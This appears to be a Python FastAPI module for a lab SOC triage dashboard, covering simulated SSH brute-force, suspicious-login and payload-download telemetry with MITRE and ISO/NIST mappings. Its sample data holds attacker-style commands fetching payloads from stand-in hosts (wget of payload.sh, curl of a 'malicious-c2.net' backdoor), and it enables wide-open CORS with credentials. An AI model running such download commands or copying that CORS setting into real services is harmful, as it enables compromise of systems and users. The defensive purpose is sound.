"""
web.py
Phase 5 - AI-Powered SOC Dashboard Web Layer & Vercel Serverless API

Provides a modern REST API and interactive web dashboard for real-time
SOC alert triage, MITRE ATT&CK correlation, compliance mapping, attack
simulation, and AI analyst insights.
"""

import copy
import logging
import os
import sys
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field

# Ensure triage directory is in Python path
_triage_dir = Path(__file__).resolve().parent
if str(_triage_dir) not in sys.path:
    sys.path.insert(0, str(_triage_dir))

from config import (
    DEFAULT_STATE_FILE,
    DETECTIONS,
    SplunkConfig,
    setup_logging,
)
from enrich import enrich_detections, label_for_score
from state import AlertStateManager, compute_alert_hash
from summarize import generate_executive_summary

logger = logging.getLogger("soc_triage.web")
setup_logging()

app = FastAPI(
    title="AI-Powered SOC Dashboard",
    version="2.0.0",
    description="Full-Stack SIEM Threat Detection, Triage Automation, and GRC Compliance Engine",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Export aliases for Vercel Python runtime entrypoints
handler = app
application = app


class TriageRunRequest(BaseModel):
    use_dedup: bool = True


class SimulateRequest(BaseModel):
    scenario: str = "full_chain"
    attempts: int = 42
    prior_failed_attempts: int = 38
    src_ip: str = "72.255.58.137"
    user: str = "ubuntu"
    command: str = "curl"
    url: str = "http://malicious-c2.net/backdoor.elf"


class AlertStatusRequest(BaseModel):
    status: str


class AiAskRequest(BaseModel):
    query: str = Field(..., description="Prompt or query for AI SOC Analyst")


# Baseline simulated telemetry representing actual lab data from Phases 2-5
DEFAULT_TELEMETRY: dict[str, Any] = {
    "T1110": {
        "name": "SSH Brute Force Detected",
        "events": [
            {
                "_time": "2026-10-12T14:30:12Z",
                "host": "ip-172-31-13-183",
                "src_ip": "72.255.58.137",
                "user": "ubuntu",
                "failed_attempts": "36",
                "status": "failed",
                "raw_log": (
                    "Oct 12 14:30:12 ip-172-31-13-183 sshd[14285]: "
                    "Failed password for ubuntu from 72.255.58.137 port 48292 ssh2"
                ),
            }
        ],
    },
    "T1078": {
        "name": "Successful Login Following Failed Attempts",
        "events": [
            {
                "_time": "2026-10-12T14:35:45Z",
                "host": "ip-172-31-13-183",
                "src_ip": "72.255.58.137",
                "user": "ubuntu",
                "prior_failed_attempts": "35",
                "status": "accepted",
                "raw_log": (
                    "Oct 12 14:35:45 ip-172-31-13-183 sshd[14301]: "
                    "Accepted password for ubuntu from 72.255.58.137 port 48310 ssh2"
                ),
            }
        ],
    },
    "T1059": {
        "name": "Suspicious Download Utility Execution",
        "events": [
            {
                "_time": "2026-10-12T14:36:10Z",
                "host": "ip-172-31-13-183",
                "command": "wget",
                "arg1": "http://198.51.100.42/payload.sh",
                "raw_log": (
                    'type=EXECVE msg=audit(1722074770.124:892): argc=3 '
                    'a0="wget" a1="http://198.51.100.42/payload.sh" a2="-O" a3="/tmp/payload.sh"'
                ),
            }
        ],
    },
}

_active_telemetry: dict[str, Any] = copy.deepcopy(DEFAULT_TELEMETRY)
_alert_dispositions: dict[str, str] = {}
_simulation_log_history: list[dict[str, str]] = [
    {
        "timestamp": "2026-10-12T14:30:12Z",
        "level": "CRIT",
        "message": "Hydra SSH Brute-Force burst (36 failures) detected from 72.255.58.137 targeting user 'ubuntu'",
    },
    {
        "timestamp": "2026-10-12T14:35:45Z",
        "level": "HIGH",
        "message": "Successful SSH login accepted for user 'ubuntu' from 72.255.58.137 after 35 prior failed attempts",
    },
    {
        "timestamp": "2026-10-12T14:36:10Z",
        "level": "HIGH",
        "message": "Auditd EXECVE captured 'wget http://198.51.100.42/payload.sh' executed on host ip-172-31-13-183",
    },
]

COMPLIANCE_MAP = [
    {
        "technique_id": "T1110",
        "technique_name": "Brute Force",
        "iso_control": "A.8.5",
        "iso_title": "Secure authentication",
        "nist_control": "AC-7",
        "nist_title": "Unsuccessful Logon Attempts",
        "audit_rationale": (
            "A.8.5 requires organizations to enforce secure authentication controls that block "
            "unauthorized credential guessing. NIST AC-7 mandates automatic action when consecutive "
            "invalid logon attempts exceed a defined threshold. T1110 monitors failed SSH attempts "
            "and triggers when 5+ failures occur from a single source."
        ),
        "evidence_source": "/var/log/auth.log via Splunk SPL search",
        "status": "EVIDENCED",
    },
    {
        "technique_id": "T1078",
        "technique_name": "Valid Accounts",
        "iso_control": "A.8.2",
        "iso_title": "Privileged access rights",
        "nist_control": "AC-2 / AC-2(12)",
        "nist_title": "Account Management (Atypical Account Usage)",
        "audit_rationale": (
            "A.8.2 and AC-2 govern privileged account monitoring. Specifically, AC-2(12) requires "
            "automated detection of atypical account usage. T1078 identifies successful logins "
            "immediately following a high volume of failed attempts from the same source IP."
        ),
        "evidence_source": "/var/log/auth.log streaming stats & correlation",
        "status": "EVIDENCED",
    },
    {
        "technique_id": "T1059",
        "technique_name": "Command and Scripting Interpreter",
        "iso_control": "A.8.16",
        "iso_title": "Monitoring activities",
        "nist_control": "AU-6",
        "nist_title": "Audit Record Review, Analysis, and Reporting",
        "audit_rationale": (
            "A.8.16 mandates monitoring system behavior for anomalies, while AU-6 mandates audit "
            "record review for unauthorized process execution. T1059 inspects Linux auditd EXECVE "
            "records for download utilities (wget/curl) deployed post-compromise."
        ),
        "evidence_source": "/var/log/audit/audit.log (type=EXECVE, a0=wget/curl)",
        "status": "EVIDENCED",
    },
]


def _get_scored_alerts(raw_results: dict[str, Any]) -> list[dict[str, Any]]:
    enriched = enrich_detections(raw_results)
    for alert in enriched:
        tech_id = alert.get("technique_id", "")
        raw = alert.get("raw_event", {})
        alert_hash = compute_alert_hash(tech_id, raw)
        alert["hash"] = alert_hash
        alert["disposition"] = _alert_dispositions.get(alert_hash, "New")

        c_entry = next((c for c in COMPLIANCE_MAP if c["technique_id"] == tech_id), None)
        if c_entry:
            alert["iso_control"] = f"{c_entry['iso_control']} ({c_entry['iso_title']})"
            alert["nist_control"] = f"{c_entry['nist_control']} ({c_entry['nist_title']})"
            alert["audit_rationale"] = c_entry["audit_rationale"]

        det_info = DETECTIONS.get(tech_id)
        if det_info:
            alert["spl_query"] = det_info.get("query", "")

    return enriched


@app.get("/api/health")
async def health_check() -> dict[str, Any]:
    """Returns system status, active mode, and Splunk connectivity diagnostics."""
    config = SplunkConfig.from_env()
    splunk_connected = False
    splunk_note = "Lab Simulation Telemetry Active"

    if config.host:
        splunk_note = f"Configured for Splunk host {config.host}:{config.port}"

    return {
        "status": "online",
        "version": "2.0.0",
        "engine": "AI-Powered SOC Triage Core",
        "deployment": "Vercel Serverless Ready",
        "timestamp": datetime.now(UTC).isoformat(),
        "active_rules": len(DETECTIONS),
        "splunk_host": config.host or "192.168.18.210 (Lab VM)",
        "splunk_connected": splunk_connected,
        "mode": "Live Splunk" if splunk_connected else "Simulation & Lab Telemetry",
        "status_note": splunk_note,
    }


@app.get("/api/alerts")
async def get_alerts(
    severity: str | None = Query(None, description="Filter by severity: Critical, High, Medium, Low"),
    technique: str | None = Query(None, description="Filter by MITRE technique ID: T1110, T1078, T1059"),
) -> dict[str, Any]:
    """Returns scored, enriched alerts sorted descending by severity score."""
    alerts = _get_scored_alerts(_active_telemetry)

    if severity:
        alerts = [a for a in alerts if a.get("severity", "").lower() == severity.lower()]
    if technique:
        alerts = [a for a in alerts if a.get("technique_id", "").upper() == technique.upper()]

    critical_count = sum(1 for a in alerts if a.get("severity") == "Critical")
    high_count = sum(1 for a in alerts if a.get("severity") == "High")
    med_count = sum(1 for a in alerts if a.get("severity") == "Medium")
    low_count = sum(1 for a in alerts if a.get("severity") == "Low")

    top_score = max((a.get("score", 0) for a in alerts), default=0)
    overall_posture = label_for_score(top_score) if alerts else "Clean"

    return {
        "total": len(alerts),
        "overall_score": top_score,
        "overall_posture": overall_posture,
        "severity_counts": {
            "critical": critical_count,
            "high": high_count,
            "medium": med_count,
            "low": low_count,
        },
        "alerts": alerts,
    }


@app.get("/api/summary")
async def get_summary() -> dict[str, Any]:
    """Generates executive summary, multi-stage attack narrative, and containment recommendations."""
    alerts = _get_scored_alerts(_active_telemetry)
    exec_summary = generate_executive_summary(alerts)

    chain = []
    technique_order = ["T1110", "T1078", "T1059"]
    for t_id in technique_order:
        matching = [a for a in alerts if a.get("technique_id") == t_id]
        if matching:
            best = matching[0]
            stage_names = {
                "T1110": "Stage 1: Credential Access (Brute Force)",
                "T1078": "Stage 2: Initial Access & Persistence (Valid Accounts)",
                "T1059": "Stage 3: Execution & Staging (Command Interpreter)",
            }
            chain.append({
                "stage": stage_names.get(t_id, t_id),
                "technique_id": t_id,
                "technique_name": best.get("technique_name"),
                "score": best.get("score"),
                "severity": best.get("severity"),
                "summary": best.get("summary"),
                "raw_event": best.get("raw_event"),
            })

    recommendations = [
        {
            "priority": "P1 - Immediate Containment",
            "action": "Firewall / Security Group Isolation",
            "command": "sudo iptables -A INPUT -s 72.255.58.137 -j DROP",
            "detail": "Quarantine adversary source IP 72.255.58.137 at host perimeter or AWS Security Group.",
        },
        {
            "priority": "P1 - Account Quarantine",
            "action": "Revoke Compromised Credentials",
            "command": "sudo passwd -l ubuntu && sudo pkill -u ubuntu",
            "detail": "Lock password for user 'ubuntu' and kill active terminal sessions on ip-172-31-13-183.",
        },
        {
            "priority": "P2 - Process Investigation & Kill",
            "action": "Auditd EXECVE Artifact Review",
            "command": "sudo pkill -f 'payload.sh' && sudo rm -f /tmp/payload.sh",
            "detail": "Inspect and terminate processes spawned by wget/curl payload retrieval.",
        },
        {
            "priority": "P3 - Hardening & GRC Remediation",
            "action": "Enforce Key-Only SSH Auth (ISO 27001 A.8.5 / NIST AC-7)",
            "command": "sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd",
            "detail": "Re-disable password authentication across all EC2 target instances.",
        },
    ]

    return {
        "timestamp": datetime.now(UTC).isoformat(),
        "alert_count": len(alerts),
        "executive_summary": exec_summary,
        "attack_chain": chain,
        "recommendations": recommendations,
    }


@app.get("/api/matrix")
async def get_matrix() -> dict[str, Any]:
    """Returns MITRE ATT&CK coverage matrix and SPL queries."""
    techniques = [
        {
            "id": "T1110",
            "name": "Brute Force",
            "tactic": "Credential Access",
            "tactic_id": "TA0006",
            "log_sources": ["Linux auth.log (SSH)"],
            "spl_query": DETECTIONS["T1110"]["query"],
            "detection_threshold": ">= 5 failed attempts per src_ip / user",
            "lab_status": "Validated with Hydra attack simulation",
            "status": "Active",
        },
        {
            "id": "T1078",
            "name": "Valid Accounts",
            "tactic": "Defense Evasion / Persistence",
            "tactic_id": "TA0005 / TA0003",
            "log_sources": ["Linux auth.log (Accepted/Failed password)"],
            "spl_query": DETECTIONS["T1078"]["query"],
            "detection_threshold": "Accepted password with prior failed attempts >= 5",
            "lab_status": "Validated with cracked credential login",
            "status": "Active",
        },
        {
            "id": "T1059",
            "name": "Command and Scripting Interpreter",
            "tactic": "Execution",
            "tactic_id": "TA0002",
            "log_sources": ["Linux audit.log (auditd EXECVE)"],
            "spl_query": DETECTIONS["T1059"]["query"],
            "detection_threshold": "auditd EXECVE execution of wget or curl",
            "lab_status": "Validated with post-exploitation download",
            "status": "Active",
        },
    ]
    return {"matrix": techniques}


@app.get("/api/compliance")
async def get_compliance() -> dict[str, Any]:
    """Returns ISO 27001:2022 and NIST SP 800-53 Rev 5 compliance control crosswalk."""
    return {
        "frameworks": ["ISO 27001:2022", "NIST SP 800-53 Rev 5"],
        "mappings": COMPLIANCE_MAP,
    }


@app.post("/api/triage/run")
async def run_triage(req: TriageRunRequest | None = None) -> dict[str, Any]:
    """Executes a fresh triage run across the telemetry stream."""
    use_dedup = req.use_dedup if req else True
    state_file = os.environ.get("STATE_FILE", DEFAULT_STATE_FILE)
    state_manager = AlertStateManager(state_file=state_file)

    results = copy.deepcopy(_active_telemetry)
    if use_dedup:
        results = state_manager.filter_new_alerts(results)

    alerts = _get_scored_alerts(results)
    summary = generate_executive_summary(alerts)

    return {
        "status": "success",
        "timestamp": datetime.now(UTC).isoformat(),
        "alerts_triaged": len(alerts),
        "alerts": alerts,
        "executive_summary": summary,
    }


@app.post("/api/simulate")
async def simulate_attack(req: SimulateRequest) -> dict[str, Any]:
    """Simulates real cyber attacks into active telemetry."""
    global _active_telemetry
    scenario = req.scenario
    now_str = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")

    if scenario == "reset":
        _active_telemetry = copy.deepcopy(DEFAULT_TELEMETRY)
        _alert_dispositions.clear()
        _simulation_log_history.append({
            "timestamp": now_str,
            "level": "INFO",
            "message": "Baseline telemetry reloaded. Alert states reset.",
        })
        alerts = _get_scored_alerts(_active_telemetry)
        return {
            "status": "reset",
            "message": "Reset to default lab telemetry baseline.",
            "alerts": alerts,
            "summary": generate_executive_summary(alerts),
        }

    if scenario == "t1110_brute_force":
        attempts = req.attempts
        event = {
            "_time": now_str,
            "host": "ip-172-31-13-183",
            "src_ip": req.src_ip,
            "user": req.user,
            "failed_attempts": str(attempts),
            "status": "failed",
            "raw_log": f"Oct 12 14:40:00 ip-172-31-13-183 sshd[15002]: Failed password for {req.user} from {req.src_ip} ({attempts} attempts)",
        }
        _active_telemetry.setdefault("T1110", {"name": "SSH Brute Force Detected", "events": []})
        _active_telemetry["T1110"]["events"].insert(0, event)
        _simulation_log_history.append({
            "timestamp": now_str,
            "level": "CRIT",
            "message": f"Simulated Hydra SSH attack ({attempts} failed attempts) against {req.user} on ip-172-31-13-183",
        })

    elif scenario == "t1078_compromise":
        prior = req.prior_failed_attempts
        event = {
            "_time": now_str,
            "host": "ip-172-31-13-183",
            "src_ip": req.src_ip,
            "user": req.user,
            "prior_failed_attempts": str(prior),
            "status": "accepted",
            "raw_log": f"Oct 12 14:41:00 ip-172-31-13-183 sshd[15015]: Accepted password for {req.user} from {req.src_ip} after {prior} failures",
        }
        _active_telemetry.setdefault("T1078", {"name": "Successful Login Following Failed Attempts", "events": []})
        _active_telemetry["T1078"]["events"].insert(0, event)
        _simulation_log_history.append({
            "timestamp": now_str,
            "level": "HIGH",
            "message": f"Simulated compromised login for {req.user} from {req.src_ip} following {prior} failures",
        })

    elif scenario == "t1059_payload":
        cmd = req.command
        url = req.url
        event = {
            "_time": now_str,
            "host": "ip-172-31-13-183",
            "command": cmd,
            "arg1": url,
            "raw_log": f'type=EXECVE msg=audit(1722075100.412:905): argc=3 a0="{cmd}" a1="{url}" a2="-o" a3="/tmp/backdoor"',
        }
        _active_telemetry.setdefault("T1059", {"name": "Suspicious Download Utility Execution", "events": []})
        _active_telemetry["T1059"]["events"].insert(0, event)
        _simulation_log_history.append({
            "timestamp": now_str,
            "level": "HIGH",
            "message": f"Simulated execve payload retrieval '{cmd} {url}' executed on ip-172-31-13-183",
        })

    elif scenario == "full_chain":
        _active_telemetry = copy.deepcopy(DEFAULT_TELEMETRY)
        _simulation_log_history.append({
            "timestamp": now_str,
            "level": "WARN",
            "message": "Full multi-stage attack lifecycle simulation loaded (T1110 -> T1078 -> T1059).",
        })

    alerts = _get_scored_alerts(_active_telemetry)
    return {
        "status": "success",
        "scenario": scenario,
        "timestamp": now_str,
        "alerts": alerts,
        "summary": generate_executive_summary(alerts),
    }


@app.post("/api/alerts/{alert_hash}/status")
async def update_alert_status(alert_hash: str, req: AlertStatusRequest) -> dict[str, Any]:
    """Updates analyst disposition status ('New', 'Investigating', 'Escalated', 'Resolved')."""
    valid_statuses = {"New", "Investigating", "Escalated", "Resolved"}
    if req.status not in valid_statuses:
        raise HTTPException(status_code=400, detail=f"Invalid status. Choose from {valid_statuses}")
    _alert_dispositions[alert_hash] = req.status
    return {"hash": alert_hash, "disposition": req.status}


@app.post("/api/state/reset")
async def reset_state() -> dict[str, Any]:
    """Resets deduplication state and restores baseline telemetry."""
    global _active_telemetry
    _active_telemetry = copy.deepcopy(DEFAULT_TELEMETRY)
    _alert_dispositions.clear()
    state_file = os.environ.get("STATE_FILE", DEFAULT_STATE_FILE)
    state_manager = AlertStateManager(state_file=state_file)
    state_manager.reset()
    return {"status": "success", "message": "Alert state and deduplication cache reset successfully."}


@app.post("/api/ai/ask")
async def ai_analyst_copilot(req: AiAskRequest) -> dict[str, Any]:
    """AI SOC Analyst Copilot providing contextual guidance, playbooks, and audits."""
    query = req.query.strip().lower()
    alerts = _get_scored_alerts(_active_telemetry)

    primary_attacker = "72.255.58.137"
    primary_host = "ip-172-31-13-183"

    for a in alerts:
        raw = a.get("raw_event", {})
        if raw.get("src_ip"):
            primary_attacker = str(raw["src_ip"])
        if raw.get("host"):
            primary_host = str(raw["host"])

    if any(k in query for k in ["ciso", "brief", "report", "executive"]):
        response_text = (
            "### ??? Executive Incident Brief ? Tier-1 SOC Incident\n\n"
            f"**Incident Status:** ACTIVE CRITICAL INCIDENT\n"
            f"**Affected Asset:** `{primary_host}` (AWS EC2 Ubuntu Target)\n"
            f"**Adversary IP:** `{primary_attacker}` (External Internet Source)\n\n"
            "**Incident Summary:**\n"
            "At approximately 14:30 UTC, the SIEM detected an automated intrusion sequence. "
            "The adversary conducted an automated Hydra SSH brute-force attack (T1110) generating 36 failed logins. "
            "Valid credentials for user `ubuntu` were subsequently obtained (T1078), followed by auditd EXECVE capture of `wget` (T1059).\n\n"
            "**Compliance Violations:**\n"
            "- **ISO 27001:2022 A.8.5** violated (weak password permitted successful brute-force cracking).\n"
            "- **NIST SP 800-53 Rev 5 AC-7** non-compliance flagged (lack of automated lockout after consecutive invalid attempts).\n\n"
            "**Containment Status:** Perimeter isolation recommended via iptables / AWS Security Group."
        )

    elif any(k in query for k in ["contain", "script", "block", "firewall", "remediate"]):
        response_text = (
            f"### ?? Automated Containment Playbook for `{primary_attacker}`\n\n"
            f"Execute the following containment commands on `{primary_host}`:\n\n"
            "```bash\n"
            f"# 1. Block attacker IP at host firewall\n"
            f"sudo iptables -I INPUT -s {primary_attacker} -j DROP\n\n"
            "# 2. Terminate all active sessions for compromised user\n"
            "sudo pkill -u ubuntu -9\n\n"
            "# 3. Lock user account password to prevent re-authentication\n"
            "sudo passwd -l ubuntu\n\n"
            "# 4. Kill suspicious payload execution and remove staged binary\n"
            "sudo pkill -f 'payload.sh'\n"
            "sudo rm -f /tmp/payload.sh /tmp/backdoor*\n\n"
            "# 5. Re-enable Key-Only SSH Auth (remediate AC-7/A.8.5)\n"
            "sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config\n"
            "sudo systemctl restart sshd\n"
            "```"
        )

    elif any(k in query for k in ["compliance", "iso", "nist", "audit"]):
        response_text = (
            "### ?? GRC Compliance Mapping Statement\n\n"
            "The detections triggered in this incident map directly to mandatory security controls:\n\n"
            f"1. **ISO 27001:2022 A.8.5 & NIST SP 800-53 AC-7 (Unsuccessful Logon Attempts)**\n"
            f"   - **Requirement:** Limit consecutive failed logins and log breaches.\n"
            f"   - **Evidence:** Splunk search on `/var/log/auth.log` aggregated 36 failed attempts from `{primary_attacker}`.\n\n"
            "2. **ISO 27001:2022 A.8.2 & NIST AC-2(12) (Atypical Account Usage)**\n"
            "   - **Requirement:** Detect anomalous account usage patterns.\n"
            "   - **Evidence:** Correlated failed password burst with immediate valid login.\n\n"
            "3. **ISO 27001:2022 A.8.16 & NIST AU-6 (Audit Record Review)**\n"
            "   - **Requirement:** Review audit records for unauthorized software execution.\n"
            "   - **Evidence:** Auditd EXECVE capture of `wget` binary execution."
        )

    elif any(k in query for k in ["scoring", "score", "formula"]):
        response_text = (
            "### ?? Explainable Scoring Formulas\n\n"
            "- **T1110 (Brute Force):** `Score = min(100, 20 + (failed_attempts * 2))`\n"
            "  * 36 attempts -> `20 + (36 * 2) = 92` -> **Critical Severity**\n\n"
            "- **T1078 (Valid Accounts):** `Score = min(100, 60 + prior_failed_attempts)`\n"
            "  * 35 prior failures -> `60 + 35 = 95` -> **Critical Severity**\n\n"
            "- **T1059 (Command Execution):** Fixed score `75` -> **High Severity**"
        )

    else:
        top_s = max((a.get("score", 0) for a in alerts), default=0)
        response_text = (
            "### ?? SOC Copilot Analysis\n\n"
            f"Active incident detected across **{len(alerts)} alerts** on `{primary_host}` originating from `{primary_attacker}`.\n\n"
            f"- **Threat Score:** {top_s}/100 (Critical).\n"
            "- **Tactics Observed:** Credential Access (T1110), Initial Access (T1078), Execution (T1059).\n"
            "- **Suggested Actions:** Review **'Attack Chain Correlation'** or request an **'Automated Containment Script'**."
        )

    return {
        "timestamp": datetime.now(UTC).isoformat(),
        "query": query,
        "response": response_text,
    }


@app.get("/", response_class=HTMLResponse)
async def serve_dashboard() -> str:
    """Delivers the complete single-page interactive AI-Powered SOC Dashboard."""
    html_file = _triage_dir / "index.html"
    if html_file.exists():
        return html_file.read_text(encoding="utf-8")
    root_html = _triage_dir.parent / "index.html"
    if root_html.exists():
        return root_html.read_text(encoding="utf-8")
    return "<h1>AI-Powered SOC Dashboard</h1><p>Dashboard HTML not found.</p>"
